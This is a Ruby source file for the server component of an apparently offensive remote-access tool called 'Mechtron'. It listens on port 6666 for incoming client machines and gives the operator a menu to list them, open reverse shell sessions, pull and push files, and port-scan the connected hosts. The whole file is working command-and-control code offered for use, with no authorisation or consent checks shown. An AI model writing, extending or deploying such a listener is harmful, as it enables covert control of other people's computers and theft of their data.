=begin
Copyright 2023 Chris Basinger

Licensed under the Apache License, Version 2.0(the "License");
you may not use this file except in compliance with the License .
You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied .
See the License for the specific language governing permissions and
limitations under the License .
=end
require 'terminal-table'
require 'socket'
require_relative 'commands'
require_relative 'client'

# Handles connections and contains the clients
class Server
  @@help_table = Terminal::Table.new do |t|
    t << ['clients', 'List all of the connected machines']
    t << :separator
    t << ['session IP', 'Use session with an IP address to start a reverse shell session. Enter "exit" to stop']
    t << :separator
    t.add_row ['get IP FILE FORMAT', 'Use get with an IP address followed by a file path and a format to download files. The format options are binary and text.']
    t.add_separator
    t.add_row ['put IP FILE FORMAT', 'Use put with an IP address followed by a file path and a format to upload files. The format options are binary and text.']
    t.add_separator
    t.add_row ['scan IP', 'Scan all of the ports on client machine']
    t.add_separator
    t.add_row ['help', 'shows the HELP menu']
    t.add_separator
    t.add_row ['exit', 'Closes Mechtron application']
  end
  def initialize(port = 6666)
    @clients = []
    @port = port
  end

  #starts the server. This handles adding new connections.
  def start
    Thread.new do
      puts "starting server on port #{@port}"
      server = TCPServer.new(@port)
      loop do
        client = Client.new(server.accept)
        @clients << client
        puts "#{client.to_s} joined"
      end
    end
    handle_commands
  end

  # handles user input for executing commands
  def handle_commands
    loop do
      command, ip, file, format = STDIN.gets.chomp.split(" ")
      if command.downcase == 'exit'
        puts 'exiting the server..'
        break
      end
      case command.downcase
      when "clients"
        print_clients
      when 'session'
        client = findClientByIp(ip)
        if client
          Commands.session client
        else
          puts 'client does not exist'
        end
      when 'get'
        client = findClientByIp(ip)
        if client
          Commands.get(client, file, format)
        else
          puts 'client does not exist'
        end
      when 'put'
        client = findClientByIp(ip)
        if client
          Commands.put(client, file, format)
        else
          puts 'client does not exist'
        end
      when 'help'
        puts @@help_table
      when 'scan'
        client = findClientByIp ip
        if client
          Commands.scan client
        else
          puts 'invalid IP'
        end
      else
        puts 'invalid command'
      end
    end
  end

  # returns the client matching the ip address
  def findClientByIp(ip)
    @clients.each do |client|
      if client.ip == ip
        return client
      end
    end
    return nil
  end

  # Prints out a list of the connected clients
  def print_clients
    if @clients.empty?
      puts 'No clients connected'
    end
    @clients.sort_by(&:id)
    @clients.each { |client| puts client.to_s}
  end
end